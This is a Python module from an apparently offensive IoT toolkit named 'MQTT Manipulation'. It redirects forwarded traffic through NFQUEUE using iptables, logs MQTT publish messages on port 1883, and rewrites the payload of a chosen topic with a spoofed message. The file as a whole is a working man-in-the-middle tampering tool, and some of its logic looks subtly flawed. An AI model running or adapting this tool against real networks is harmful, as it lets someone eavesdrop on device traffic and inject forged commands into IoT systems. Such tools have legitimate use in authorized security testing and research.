import os
import time
import threading

import netfilterqueue
from printib import * 
from scapy.all import *

from module import Module

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "MQTT Manipulation",
                       "Description": "MQTT v3.1.1 manipulation to modify messages on QoS 0",
                       "Author": "@toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"mqtt_topic_modify": ["#", "topic to be modified", True],
                   "msg_spoof": ["hello world!", "message spoofing", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        options = self.options

        def create_mqtt_publish_packet(topic, msg, qos=None):
            pub_header = 0x30  # pub header with QoS 0
            topic_len = len(topic)
            msg_len = len(msg)
            total_len = 2 + topic_len + msg_len

            if total_len > 127:
                variable_len_field_1 = 128 + (total_len & 127)
                variable_len_field_2 = total_len // 128
                if variable_len_field_2 > 3:
                    raise Exception('Malformed length field')
                total_len_field = variable_len_field_1.to_bytes() + variable_len_field_2.to_bytes()
            else:
                total_len_field = total_len.to_bytes()

            mqtt_packet = pub_header.to_bytes() + total_len_field + topic_len.to_bytes(2) + topic.encode() + msg.encode()

            return mqtt_packet

        def mqtt_spoof(pkt):
            mqtt_packet = IP(pkt.get_payload())
            if mqtt_packet.haslayer(TCP) and mqtt_packet[TCP].dport == 1883:
                if mqtt_packet.haslayer(Raw):
                    load = mqtt_packet[Raw].load
                    if load[0] == 0x30:  # pub header with QoS 0
                        total_len = load[1]
                        if total_len > 127:
                            # offset for variable field lenght
                            len_offset = 128 * (load[2] - 1)
                            total_len += len_offset
                            len_topic = int.from_bytes(load[3:5])
                            topic = load[5:len_topic+5].decode()
                            try:
                                msg = load[5 + len_topic:].decode()
                            except Exception as e:
                                msg = load[5 + len_topic:]
                                pkt.drop()
                                return
                        else:
                            len_topic = int.from_bytes(load[2:4])
                            topic = load[4:len_topic+4].decode()
                            try:
                                # Non compatible with MQTT v5.0 (first byte must be 0)
                    	        msg = load[4 + len_topic:].decode()
                            except Exception as e:
                                msg = load[4 + len_topic:]
                                pkt.accept()
                                return

                        print_info("")
                        print_info("---[ MQTT Pub Package Detected ]---")
                        print_info(f'topic: {topic}')
                        print_info(f'message: {msg}')
                        print_info("---[ MQTT Pub Package Detected ]---")
                        print_info("")

                        mqtt_topic_modify = self.options["mqtt_topic_modify"][0]
                        msg_spoof = self.options["msg_spoof"][0]

                        if topic == mqtt_topic_modify:
                            try:
                                new_mqtt_packet = create_mqtt_publish_packet(
                                    mqtt_topic_modify, msg_spoof)
                            except Exception as e:
                                print_error(f'Error: {e}')
                                pkt.accept()
                                return
                        
                            new_total_len = 2 + len(mqtt_topic_modify) + len(msg_spoof)
                            diff = new_total_len - total_len

                            # Reconstrucción del paquete
                            new_packet = mqtt_packet
                            new_packet[Raw].load = new_mqtt_packet
                            del new_packet[IP].len
                            del new_packet[IP].chksum
                            del new_packet[TCP].chksum
                            pkt.set_payload(bytes(new_packet))
                            print_ok("Packet modified correctly")

            pkt.accept()

        def nfqueuebind(queue):
            try:
                queue.bind(0, mqtt_spoof)
                queue.run()
            except KeyboardInterrupt:
                print_info("Closing queue bind...")
                queue.unbind()

        def go(options):

            #Enable iptables rules
            print_info("Adding iptables rules")
            os.system("iptables -I FORWARD -j NFQUEUE")

            queue = netfilterqueue.NetfilterQueue()
            thread2 = threading.Thread(target=nfqueuebind,args=(queue,))   
            thread2.start()
            thread2.setDaemon = True

            t = threading.currentThread()
            while getattr(t, "do_run", True):
                time.sleep(1)
            
            print_info("Removing iptables rules")
            #Disable iptables rules
            os.system("iptables -D FORWARD -j NFQUEUE")
            queue.unbind()
        
        thread1 = threading.Thread(target=go, args=(self.options,))
        thread1.start() 
       
        super(CustomModule, self).run(t=thread1)
